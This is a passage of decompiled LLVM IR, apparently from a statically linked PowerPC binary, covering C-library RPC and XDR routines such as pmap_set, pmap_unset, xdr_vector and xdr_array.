  store i32 ptrtoint ([53 x i8]* @global_var_1002fba4.1409 to i32), i32* @r3, align 4
  br label %dec_label_pc_10027644

dec_label_pc_10027644:                            ; preds = %dec_label_pc_10027688, %dec_label_pc_10027600, %dec_label_pc_1002763c
  %stack_var_-4164.0 = phi i32 [ %stack_var_-4164.1.ph, %dec_label_pc_10027688 ], [ %v2_1002761c, %dec_label_pc_1002763c ], [ %tmp6, %dec_label_pc_10027600 ]
  store i32 ptrtoint ([3 x i8]* @global_var_10027648.1410 to i32), i32* @lr, align 4
  %v0_10027644 = call i32 @perror()
  %v0_1002764c = call i32 @__GI_exit()
  br label %dec_label_pc_10027650.preheader

dec_label_pc_10027650.preheader:                  ; preds = %dec_label_pc_10027644, %dec_label_pc_1002760c
  %stack_var_-4164.1.ph = phi i32 [ %stack_var_-4164.0, %dec_label_pc_10027644 ], [ %v2_1002761c, %dec_label_pc_1002760c ]
  %v2_1002765c = ptrtoint i32* %stack_var_-4160 to i32
  %tmp16 = urem i16 %tmp, 2
  %v3_10027698 = icmp eq i16 %tmp16, 0
  %v1_100276ac = and i16 %tmp, 8
  %v3_100276ac = icmp eq i16 %v1_100276ac, 0
  br label %dec_label_pc_10027650

dec_label_pc_10027650:                            ; preds = %dec_label_pc_10027650.preheader, %dec_label_pc_100276f8
  store i32 %stack_var_-4164.1.ph, i32* @r31, align 4
  %v3_10027654 = load i32, i32* %stack_var_-4168, align 4
  store i32 %v3_10027654, i32* @r30, align 4
  %v3_100276e84 = icmp eq i32 %v3_10027654, 0
  br i1 %v3_100276e84, label %dec_label_pc_100276f0, label %dec_label_pc_1002765c

dec_label_pc_1002765c:                            ; preds = %dec_label_pc_10027650, %dec_label_pc_100276e0
  store i32 35091, i32* @r4, align 4
  store i32 %v2_1002765c, i32* @r5, align 4
  %v0_10027674 = load i32, i32* @r29, align 4
  store i32 %v0_10027674, i32* @r3, align 4
  store i32 268596864, i32* @lr, align 4
  %v0_1002767c = call i32 @ioctl()
  %tmp15 = icmp sgt i32 %v0_1002767c, -1
  br i1 %tmp15, label %dec_label_pc_10027694, label %dec_label_pc_10027688

dec_label_pc_10027688:                            ; preds = %dec_label_pc_1002765c
  store i32 ptrtoint ([23 x i8]* @global_var_1002fbdc.1411 to i32), i32* @r3, align 4
  br label %dec_label_pc_10027644

dec_label_pc_10027694:                            ; preds = %dec_label_pc_1002765c
  %v0_100276e0.pre = load i32, i32* @r31, align 4
  br i1 %v3_10027698, label %dec_label_pc_100276e0, label %dec_label_pc_100276a0

dec_label_pc_100276a0:                            ; preds = %dec_label_pc_10027694
  %v1_100276a0 = add i32 %v0_100276e0.pre, 16
  %v2_100276a0 = inttoptr i32 %v1_100276a0 to i16*
  %v3_100276a0 = load i16, i16* %v2_100276a0, align 2
  %v3_100276a4 = icmp eq i16 %v3_100276a0, 2
  br i1 %v3_100276a4, label %dec_label_pc_100276ac, label %dec_label_pc_100276e0

dec_label_pc_100276ac:                            ; preds = %dec_label_pc_100276a0
  br i1 %v3_100276ac, label %dec_label_pc_100276b4, label %dec_label_pc_100276bc

dec_label_pc_100276b4:                            ; preds = %dec_label_pc_100276ac
  %v0_100276b4 = load i32, i32* @r28, align 4
  %v3_100276b4 = icmp eq i32 %v0_100276b4, 0
  br i1 %v3_100276b4, label %dec_label_pc_100276bc, label %dec_label_pc_100276e0

dec_label_pc_100276bc:                            ; preds = %dec_label_pc_100276b4, %dec_label_pc_100276ac
  %v0_100276cc = load i32, i32* @r29, align 4
  %v2_100276d0 = load i32, i32* @r27, align 4
  %v3_100276d0 = add i32 %v2_100276d0, 2
  %v4_100276d0 = inttoptr i32 %v3_100276d0 to i16*
  store i16 111, i16* %v4_100276d0, align 2
  store i32 ptrtoint ([3 x i8]* @global_var_100276d8.1412 to i32), i32* @lr, align 4
  %v1_100276d4 = call i32 @__libc_close(i32 %v0_100276cc)
  br label %dec_label_pc_1002770c

dec_label_pc_100276e0:                            ; preds = %dec_label_pc_10027694, %dec_label_pc_100276b4, %dec_label_pc_100276a0
  %v1_100276e0 = add i32 %v0_100276e0.pre, 32
  store i32 %v1_100276e0, i32* @r31, align 4
  %v0_100276e4 = load i32, i32* @r30, align 4
  %v1_100276e4 = add i32 %v0_100276e4, -32
  store i32 %v1_100276e4, i32* @r30, align 4
  %v3_100276e8 = icmp eq i32 %v1_100276e4, 0
  br i1 %v3_100276e8, label %dec_label_pc_100276f0, label %dec_label_pc_1002765c

dec_label_pc_100276f0:                            ; preds = %dec_label_pc_100276e0, %dec_label_pc_10027650
  %v0_100276f0 = load i32, i32* @r28, align 4
  %v3_100276f0 = icmp eq i32 %v0_100276f0, 1
  br i1 %v3_100276f0, label %dec_label_pc_100276f8, label %dec_label_pc_10027700

dec_label_pc_100276f8:                            ; preds = %dec_label_pc_100276f0
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_10027650

dec_label_pc_10027700:                            ; preds = %dec_label_pc_100276f0
  %v0_10027700 = load i32, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10027708.1413 to i32), i32* @lr, align 4
  %v1_10027704 = call i32 @__libc_close(i32 %v0_10027700)
  br label %dec_label_pc_1002770c

dec_label_pc_1002770c:                            ; preds = %dec_label_pc_100276bc, %dec_label_pc_10027700
  %storemerge1 = phi i32 [ 0, %dec_label_pc_10027700 ], [ 1, %dec_label_pc_100276bc ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v1_100276e4, { 1, 0 }
  uselistorder i32* %stack_var_-4168, { 0, 2, 1 }
  uselistorder i32 (i32)* @__libc_close, { 1, 0, 8, 7, 6, 26, 25, 24, 23, 22, 21, 20, 19, 27, 18, 9, 17, 16, 15, 14, 13, 12, 5, 11, 10, 3, 2, 4 }
  uselistorder i32 35091, { 1, 2, 0 }
  uselistorder i16 8, { 0, 6, 1, 2, 3, 4, 5 }
  uselistorder i16 2, { 15, 0, 16, 1, 14, 17, 2, 3, 18, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 ()* @__GI_exit, { 7, 0, 1, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 6, 5, 4, 3, 2, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 8, 17, 16, 15, 14, 13, 12, 11, 10, 9 }
  uselistorder i32 ()* @perror, { 0, 2, 1 }
  uselistorder i32 ()* @ioctl, { 5, 4, 11, 10, 9, 8, 13, 12, 3, 0, 2, 1, 14, 7, 6 }
  uselistorder i32 35090, { 1, 0, 2 }
  uselistorder i32 4096, { 3, 4, 1, 24, 2, 5, 28, 29, 6, 7, 8, 25, 9, 10, 26, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 27, 0, 21, 22, 23 }
  uselistorder i32 (i32, i32, i32)* @socket, { 1, 39, 37, 5, 0, 15, 36, 35, 34, 38, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 14, 13, 12, 2, 11, 10, 9, 8, 7, 6, 4, 3 }
  uselistorder label %dec_label_pc_1002770c, { 1, 0 }
  uselistorder label %dec_label_pc_100276e0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1002765c, { 1, 0 }
  uselistorder label %dec_label_pc_10027650, { 1, 0 }
  uselistorder label %dec_label_pc_10027644, { 0, 2, 1 }
}

define i32 @__GI_pmap_unset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v2_1002772c = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_1002772c, i32* %r29.global-to-local, align 4
  store i32 -1, i32* %stack_var_-72, align 4
  store i32 268597068, i32* @lr, align 4
  %v1_10027748 = call i32 @__get_myaddress(i32 %v2_1002772c)
  %v2_1002774c = ptrtoint i32* %stack_var_-24 to i32
  %v3_10027750 = icmp eq i32 %v1_10027748, 0
  store i32 %v2_1002774c, i32* @r6, align 4
  %v2_10027760 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_10027760, i32* @r7, align 4
  store i32 400, i32* @r8, align 4
  store i32 400, i32* @r9, align 4
  br i1 %v3_10027750, label %dec_label_pc_10027818, label %dec_label_pc_10027778

dec_label_pc_10027778:                            ; preds = %entry
  store i32 5, i32* %stack_var_-24, align 4
  store i32 268597140, i32* @lr, align 4
  %v9_10027790 = call i32 @__GI_clntudp_bufcreate(i32 %v2_1002772c, i32 100000, i32 2)
  store i32 %v9_10027790, i32* %r29.global-to-local, align 4
  %v3_10027794 = icmp eq i32 %v9_10027790, 0
  %v2_100277b8 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_100277b8, i32* @r8, align 4
  br i1 %v3_10027794, label %dec_label_pc_10027818, label %dec_label_pc_100277c0

dec_label_pc_100277c0:                            ; preds = %dec_label_pc_10027778
  store i32 60, i32* %stack_var_-24, align 4
  %v1_100277e8 = add i32 %v9_10027790, 4
  %v2_100277e8 = inttoptr i32 %v1_100277e8 to i32*
  %v3_100277e8 = load i32, i32* %v2_100277e8, align 4
  %v1_100277ec = inttoptr i32 %v3_100277e8 to i32*
  %v2_100277ec = load i32, i32* %v1_100277ec, align 4
  call void @__pseudo_call(i32 %v2_100277ec)
  %v0_100277f8 = load i32, i32* %r29.global-to-local, align 4
  %v1_100277f8 = add i32 %v0_100277f8, 4
  %v2_100277f8 = inttoptr i32 %v1_100277f8 to i32*
  %v3_100277f8 = load i32, i32* %v2_100277f8, align 4
  %v1_10027800 = add i32 %v3_100277f8, 16
  %v2_10027800 = inttoptr i32 %v1_10027800 to i32*
  %v3_10027800 = load i32, i32* %v2_10027800, align 4
  call void @__pseudo_call(i32 %v3_10027800)
  %v3_1002780c = load i32, i32* %stack_var_-68, align 4
  br label %dec_label_pc_10027818

dec_label_pc_10027818:                            ; preds = %entry, %dec_label_pc_10027778, %dec_label_pc_100277c0
  %storemerge = phi i32 [ %v3_1002780c, %dec_label_pc_100277c0 ], [ 0, %dec_label_pc_10027778 ], [ 0, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder label %dec_label_pc_10027818, { 2, 1, 0 }
}

define i32 @pmap_set(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %v2_10027838 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_10027838, i32* %r29.global-to-local, align 4
  store i32 -1, i32* %stack_var_-88, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10027860.1418 to i32), i32* @lr, align 4
  %v1_1002785c = call i32 @__get_myaddress(i32 %v2_10027838)
  %v2_10027860 = ptrtoint i32* %stack_var_-40 to i32
  %v3_10027864 = icmp eq i32 %v1_1002785c, 0
  store i32 %v2_10027860, i32* @r6, align 4
  %v2_10027874 = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v2_10027874, i32* @r7, align 4
  store i32 400, i32* @r8, align 4
  store i32 400, i32* @r9, align 4
  br i1 %v3_10027864, label %dec_label_pc_10027948, label %dec_label_pc_1002788c

dec_label_pc_1002788c:                            ; preds = %entry
  store i32 5, i32* %stack_var_-40, align 4
  store i32 268597416, i32* @lr, align 4
  %v9_100278a4 = call i32 @__GI_clntudp_bufcreate(i32 %v2_10027838, i32 100000, i32 2)
  store i32 %v9_100278a4, i32* %r29.global-to-local, align 4
  %v3_100278a8 = icmp eq i32 %v9_100278a4, 0
  %v2_100278c8 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_100278c8, i32* @r8, align 4
  br i1 %v3_100278a8, label %dec_label_pc_10027948, label %dec_label_pc_10027928

dec_label_pc_10027928:                            ; preds = %dec_label_pc_1002788c
  store i32 60, i32* %stack_var_-40, align 4
  %v1_100278f8 = add i32 %v9_100278a4, 4
  %v2_100278f8 = inttoptr i32 %v1_100278f8 to i32*
  %v3_100278f8 = load i32, i32* %v2_100278f8, align 4
  %v1_100278fc = inttoptr i32 %v3_100278f8 to i32*
  %v2_100278fc = load i32, i32* %v1_100278fc, align 4
  call void @__pseudo_call(i32 %v2_100278fc)
  store i32 ptrtoint ([24 x i8]* @global_var_1002fbf4.1419 to i32), i32* @r4, align 4
  %v0_10027914 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10027914, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10027920.1420 to i32), i32* @lr, align 4
  %v3_1002791c = call i32 @clnt_perror(i32 %v0_10027914, i32 ptrtoint ([24 x i8]* @global_var_1002fbf4.1419 to i32))
  store i32 0, i32* %stack_var_-84, align 4
  %v0_10027928.pre = load i32, i32* @r29, align 4
  %v1_10027928 = add i32 %v0_10027928.pre, 4
  %v2_10027928 = inttoptr i32 %v1_10027928 to i32*
  %v3_10027928 = load i32, i32* %v2_10027928, align 4
  %v1_10027930 = add i32 %v3_10027928, 16
  %v2_10027930 = inttoptr i32 %v1_10027930 to i32*
  %v3_10027930 = load i32, i32* %v2_10027930, align 4
  call void @__pseudo_call(i32 %v3_10027930)
  %v3_1002793c = load i32, i32* %stack_var_-84, align 4
  br label %dec_label_pc_10027948

dec_label_pc_10027948:                            ; preds = %entry, %dec_label_pc_1002788c, %dec_label_pc_10027928
  %storemerge = phi i32 [ %v3_1002793c, %dec_label_pc_10027928 ], [ 0, %dec_label_pc_1002788c ], [ 0, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-88, { 1, 0 }
  uselistorder i32 60, { 13, 14, 24, 25, 6, 1, 16, 26, 19, 17, 18, 28, 29, 27, 32, 33, 31, 30, 4, 5, 20, 2, 7, 9, 8, 10, 12, 11, 21, 3, 22, 23, 0, 15 }
  uselistorder i32 (i32, i32, i32)* @__GI_clntudp_bufcreate, { 3, 1, 0, 2 }
  uselistorder i32 100000, { 1, 2, 0 }
  uselistorder i32* @r9, { 18, 39, 42, 50, 40, 41, 37, 19, 38, 43, 0, 78, 60, 61, 14, 51, 52, 53, 3, 12, 62, 70, 71, 1, 44, 20, 21, 15, 16, 17, 72, 22, 24, 23, 4, 73, 74, 8, 76, 63, 64, 9, 10, 65, 11, 25, 5, 6, 26, 27, 28, 29, 30, 32, 31, 13, 45, 46, 47, 48, 49, 56, 59, 2, 77, 66, 67, 7, 68, 69, 57, 58, 33, 34, 54, 55, 75, 35, 36 }
  uselistorder i32 400, { 3, 4, 8, 9, 0, 6, 7, 1, 2, 5 }
  uselistorder i32* @r7, { 7, 17, 18, 19, 5, 6, 15, 16, 8, 9, 10, 0, 1, 2, 3, 11, 13, 12, 14, 4 }
  uselistorder i32* @r6, { 10, 29, 8, 9, 27, 11, 28, 30, 31, 32, 17, 33, 34, 35, 36, 20, 19, 21, 12, 13, 0, 1, 2, 3, 4, 5, 37, 38, 39, 23, 25, 15, 16, 18, 22, 26, 24, 14, 6, 7 }
  uselistorder i32 (i32)* @__get_myaddress, { 1, 0 }
  uselistorder label %dec_label_pc_10027948, { 2, 1, 0 }
}

define i32 @_rpc_dtablesize() local_unnamed_addr {
entry:
  %v0_10027964 = load i32, i32* @r31, align 4
  %v3_10027970 = load i32, i32* @global_var_10045294.1421, align 4
  %v3_10027974 = icmp eq i32 %v3_10027970, 0
  br i1 %v3_10027974, label %dec_label_pc_1002797c, label %dec_label_pc_10027984

dec_label_pc_1002797c:                            ; preds = %entry
  store i32 268597632, i32* @lr, align 4
  %v0_1002797c = call i32 @getdtablesize()
  store i32 %v0_1002797c, i32* @global_var_10045294.1421, align 4
  br label %dec_label_pc_10027984

dec_label_pc_10027984:                            ; preds = %entry, %dec_label_pc_1002797c
  %v3_10027988 = phi i32 [ %v3_10027970, %entry ], [ %v0_1002797c, %dec_label_pc_1002797c ]
  store i32 %v0_10027964, i32* @r31, align 4
  ret i32 %v3_10027988

; uselistorder directives
  uselistorder i32 ()* @getdtablesize, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10027984, { 1, 0 }
}

define i32 @xdr_vector(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r26.global-to-local, align 4
  store i32 %arg3, i32* %r27.global-to-local, align 4
  store i32 %arg4, i32* %r28.global-to-local, align 4
  store i32 %arg5, i32* %r29.global-to-local, align 4
  %v2_100279dc9 = icmp eq i32 %arg3, 0
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v2_100279ec11 = add i32 %arg2, %arg4
  store i32 %v2_100279ec11, i32* %r31.global-to-local, align 4
  store i32 1, i32* %r30.global-to-local, align 4
  br i1 %v2_100279dc9, label %dec_label_pc_100279f8, label %dec_label_pc_100279c8

dec_label_pc_100279c8:                            ; preds = %entry, %dec_label_pc_100279c8.dec_label_pc_100279dc_crit_edge.dec_label_pc_100279c8_crit_edge
  %v0_100279c8 = phi i32 [ %v0_100279c8.pre, %dec_label_pc_100279c8.dec_label_pc_100279dc_crit_edge.dec_label_pc_100279c8_crit_edge ], [ %arg5, %entry ]
  call void @__pseudo_call(i32 %v0_100279c8)
  %v0_100279d4 = load i32, i32* %r3.global-to-local, align 4
  %v3_100279d4 = icmp eq i32 %v0_100279d4, 0
  br i1 %v3_100279d4, label %dec_label_pc_100279fc, label %dec_label_pc_100279c8.dec_label_pc_100279dc_crit_edge

dec_label_pc_100279c8.dec_label_pc_100279dc_crit_edge: ; preds = %dec_label_pc_100279c8
  %v0_100279dc.pre = load i32, i32* %r30.global-to-local, align 4
  %v1_100279dc.pre = load i32, i32* %r27.global-to-local, align 4
  %v0_100279e0.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_100279e4.pre = load i32, i32* %r26.global-to-local, align 4
  %v1_100279ec.pre = load i32, i32* %r28.global-to-local, align 4
  %v2_100279dc = icmp ult i32 %v0_100279dc.pre, %v1_100279dc.pre
  store i32 %v0_100279e4.pre, i32* %r3.global-to-local, align 4
  %v2_100279ec = add i32 %v0_100279e0.pre, %v1_100279ec.pre
  store i32 %v2_100279ec, i32* %r31.global-to-local, align 4
  %v1_100279f0 = add i32 %v0_100279dc.pre, 1
  store i32 %v1_100279f0, i32* %r30.global-to-local, align 4
  br i1 %v2_100279dc, label %dec_label_pc_100279c8.dec_label_pc_100279dc_crit_edge.dec_label_pc_100279c8_crit_edge, label %dec_label_pc_100279f8

dec_label_pc_100279c8.dec_label_pc_100279dc_crit_edge.dec_label_pc_100279c8_crit_edge: ; preds = %dec_label_pc_100279c8.dec_label_pc_100279dc_crit_edge
  %v0_100279c8.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_100279c8

dec_label_pc_100279f8:                            ; preds = %entry, %dec_label_pc_100279c8.dec_label_pc_100279dc_crit_edge
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100279fc

dec_label_pc_100279fc:                            ; preds = %dec_label_pc_100279c8, %dec_label_pc_100279f8
  %v0_10027a0c = phi i32 [ 1, %dec_label_pc_100279f8 ], [ 0, %dec_label_pc_100279c8 ]
  ret i32 %v0_10027a0c

; uselistorder directives
  uselistorder i32 %v0_100279dc.pre, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_100279fc, { 1, 0 }
  uselistorder label %dec_label_pc_100279f8, { 1, 0 }
  uselistorder label %dec_label_pc_100279c8, { 1, 0 }
}

define i32 @__GI_xdr_array(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg6, i32* @r8, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  store i32 %arg2, i32* @r26, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg4, i32* %r28.global-to-local, align 4
  store i32 %arg5, i32* %r25.global-to-local, align 4
  store i32 %arg6, i32* %r24.global-to-local, align 4
  store i32 %tmp, i32* @r27, align 4
  %v1_10027a3c = inttoptr i32 %arg2 to i32*
  %v2_10027a3c = load i32, i32* %v1_10027a3c, align 4
  store i32 %v2_10027a3c, i32* @r31, align 4
  store i32 268597828, i32* @lr, align 4
  %v2_10027a40 = inttoptr i32 %arg3 to i32*
  %v4_10027a40 = call i32 @xdr_u_int(i32* %v2_10027a40, i32* %v2_10027a40)
  store i32 %v4_10027a40, i32* %r3.global-to-local, align 4
  %v3_10027a44 = icmp eq i32 %v4_10027a40, 0
  br i1 %v3_10027a44, label %dec_label_pc_10027b3c, label %dec_label_pc_10027a4c

dec_label_pc_10027a4c:                            ; preds = %entry
  %v0_10027a4c = load i32, i32* %r30.global-to-local, align 4
  %v1_10027a4c = inttoptr i32 %v0_10027a4c to i32*
  %v2_10027a4c = load i32, i32* %v1_10027a4c, align 4
  store i32 %v2_10027a4c, i32* @r29, align 4
  %v1_10027a50 = load i32, i32* %r28.global-to-local, align 4
  %v3_10027a50 = icmp ugt i32 %v2_10027a4c, %v1_10027a50
  br i1 %v3_10027a50, label %dec_label_pc_10027a68, label %dec_label_pc_10027a58

dec_label_pc_10027a58:                            ; preds = %dec_label_pc_10027a4c
  %v1_10027a5c = load i32, i32* %r25.global-to-local, align 4
  %v2_10027a5c = udiv i32 -1, %v1_10027a5c
  %v3_10027a60 = icmp ugt i32 %v2_10027a4c, %v2_10027a5c
  br i1 %v3_10027a60, label %dec_label_pc_10027a68, label %dec_label_pc_10027a74

dec_label_pc_10027a68:                            ; preds = %dec_label_pc_10027a58, %dec_label_pc_10027a4c
  %v0_10027a68 = load i32, i32* @r27, align 4
  %v1_10027a68 = inttoptr i32 %v0_10027a68 to i32*
  %v2_10027a68 = load i32, i32* %v1_10027a68, align 4
  %v3_10027a6c = icmp eq i32 %v2_10027a68, 2
  br i1 %v3_10027a6c, label %dec_label_pc_10027a74, label %dec_label_pc_10027b3c

dec_label_pc_10027a74:                            ; preds = %dec_label_pc_10027a68, %dec_label_pc_10027a58
  %v0_10027a74 = load i32, i32* @r31, align 4
  %v3_10027a74 = icmp eq i32 %v0_10027a74, 0
  br i1 %v3_10027a74, label %dec_label_pc_10027a7c, label %dec_label_pc_10027adc

dec_label_pc_10027a7c:                            ; preds = %dec_label_pc_10027a74
  %v0_10027a7c = load i32, i32* @r27, align 4
  %v1_10027a7c = inttoptr i32 %v0_10027a7c to i32*
  %v2_10027a7c = load i32, i32* %v1_10027a7c, align 4
  %v3_10027a80 = icmp eq i32 %v2_10027a7c, 1
  br i1 %v3_10027a80, label %dec_label_pc_10027a94, label %dec_label_pc_10027a88

dec_label_pc_10027a88:                            ; preds = %dec_label_pc_10027a7c
  %v3_10027a88 = icmp eq i32 %v2_10027a7c, 2
  br i1 %v3_10027a88, label %dec_label_pc_10027b44, label %dec_label_pc_10027adc

dec_label_pc_10027a94:                            ; preds = %dec_label_pc_10027a7c
  %v3_10027a94 = icmp eq i32 %v2_10027a4c, 0
  br i1 %v3_10027a94, label %dec_label_pc_10027b44, label %dec_label_pc_10027a9c

dec_label_pc_10027a9c:                            ; preds = %dec_label_pc_10027a94
  %v1_10027a9c = load i32, i32* %r25.global-to-local, align 4
  %v2_10027a9c = mul i32 %v1_10027a9c, %v2_10027a4c
  store i32 %v2_10027a9c, i32* @r30, align 4
  store i32 %v2_10027a9c, i32* @r3, align 4
  store i32 268597928, i32* @lr, align 4
  %v0_10027aa4 = call i32 @malloc()
  store i32 %v0_10027aa4, i32* @r3, align 4
  %v3_10027aa8 = icmp eq i32 %v0_10027aa4, 0
  store i32 %v0_10027aa4, i32* @r31, align 4
  %v1_10027ab0 = load i32, i32* @r26, align 4
  %v2_10027ab0 = inttoptr i32 %v1_10027ab0 to i32*
  store i32 %v0_10027aa4, i32* %v2_10027ab0, align 4
  br i1 %v3_10027aa8, label %dec_label_pc_10027ab8, label %dec_label_pc_10027ad0

dec_label_pc_10027ab8:                            ; preds = %dec_label_pc_10027a9c
  %v3_10027ac0 = load i32, i32* @global_var_1004511c, align 4
  store i32 ptrtoint ([26 x i8]* @global_var_1002fc1c.1422 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10027acc.1423 to i32), i32* @lr, align 4
  %v4_10027ac8 = call i32 @__GI_fputs(i32 ptrtoint ([26 x i8]* @global_var_1002fc1c.1422 to i32), i32 %v3_10027ac0, i32 268697600)
  store i32 %v4_10027ac8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10027b3c

dec_label_pc_10027ad0:                            ; preds = %dec_label_pc_10027a9c
  %v0_10027ad0 = load i32, i32* @r30, align 4
  store i32 %v0_10027ad0, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i32 268597980, i32* @lr, align 4
  %v0_10027ad8 = call i32 @__GI_memset()
  store i32 %v0_10027ad8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10027adc

dec_label_pc_10027adc:                            ; preds = %dec_label_pc_10027a88, %dec_label_pc_10027a74, %dec_label_pc_10027ad0
  store i32 0, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_10027af8

dec_label_pc_10027ae8:                            ; preds = %dec_label_pc_10027af8
  %v0_10027ae8 = load i32, i32* %r24.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_10027ae8)
  %v0_10027af4 = load i32, i32* %r3.global-to-local, align 4
  %v0_10027af8.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_10027af8

dec_label_pc_10027af8:                            ; preds = %dec_label_pc_10027adc, %dec_label_pc_10027ae8
  %v0_10027b10 = phi i32 [ 0, %dec_label_pc_10027adc ], [ %v0_10027af8.pre, %dec_label_pc_10027ae8 ]
  %storemerge = phi i32 [ 1, %dec_label_pc_10027adc ], [ %v0_10027af4, %dec_label_pc_10027ae8 ]
  store i32 %storemerge, i32* @r30, align 4
  %v1_10027af8 = load i32, i32* @r29, align 4
  %v0_10027afc = load i32, i32* @r31, align 4
  %v0_10027b00 = load i32, i32* @r27, align 4
  store i32 %v0_10027b00, i32* %r3.global-to-local, align 4
  %v3_10027b08 = icmp eq i32 %storemerge, 0
  %v1_10027b0c = load i32, i32* %r25.global-to-local, align 4
  %v2_10027b0c = add i32 %v1_10027b0c, %v0_10027afc
  store i32 %v2_10027b0c, i32* @r31, align 4
  %v1_10027b10 = add i32 %v0_10027b10, 1
  store i32 %v1_10027b10, i32* %r28.global-to-local, align 4
  %.not = icmp uge i32 %v0_10027b10, %v1_10027af8
  %brmerge = or i1 %v3_10027b08, %.not
  br i1 %brmerge, label %dec_label_pc_10027b1c, label %dec_label_pc_10027ae8

dec_label_pc_10027b1c:                            ; preds = %dec_label_pc_10027af8
  %v1_10027b1c = inttoptr i32 %v0_10027b00 to i32*
  %v2_10027b1c = load i32, i32* %v1_10027b1c, align 4
  %v3_10027b20 = icmp eq i32 %v2_10027b1c, 2
  br i1 %v3_10027b20, label %dec_label_pc_10027b28, label %dec_label_pc_10027b48

dec_label_pc_10027b28:                            ; preds = %dec_label_pc_10027b1c
  %v0_10027b28 = load i32, i32* @r26, align 4
  %v1_10027b28 = inttoptr i32 %v0_10027b28 to i32*
  %v2_10027b28 = load i32, i32* %v1_10027b28, align 4
  store i32 %v2_10027b28, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10027b30.1424 to i32), i32* @lr, align 4
  %v0_10027b2c = call i32 @free()
  store i32 %v0_10027b2c, i32* %r3.global-to-local, align 4
  %v1_10027b34 = load i32, i32* @r26, align 4
  %v2_10027b34 = inttoptr i32 %v1_10027b34 to i32*
  store i32 0, i32* %v2_10027b34, align 4
  %v0_10027b4c.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10027b48

dec_label_pc_10027b3c:                            ; preds = %dec_label_pc_10027a68, %entry, %dec_label_pc_10027ab8
  store i32 0, i32* @r30, align 4
  br label %dec_label_pc_10027b48

dec_label_pc_10027b44:                            ; preds = %dec_label_pc_10027a88, %dec_label_pc_10027a94
  store i32 1, i32* @r30, align 4
  br label %dec_label_pc_10027b48

dec_label_pc_10027b48:                            ; preds = %dec_label_pc_10027b1c, %dec_label_pc_10027b3c, %dec_label_pc_10027b28, %dec_label_pc_10027b44
  %v0_10027b4c = phi i32 [ %storemerge, %dec_label_pc_10027b1c ], [ 0, %dec_label_pc_10027b3c ], [ %v0_10027b4c.pre, %dec_label_pc_10027b28 ], [ 1, %dec_label_pc_10027b44 ]
  store i32 %v0_10027b4c, i32* %r3.global-to-local, align 4
  ret i32 %v0_10027b4c

; uselistorder directives
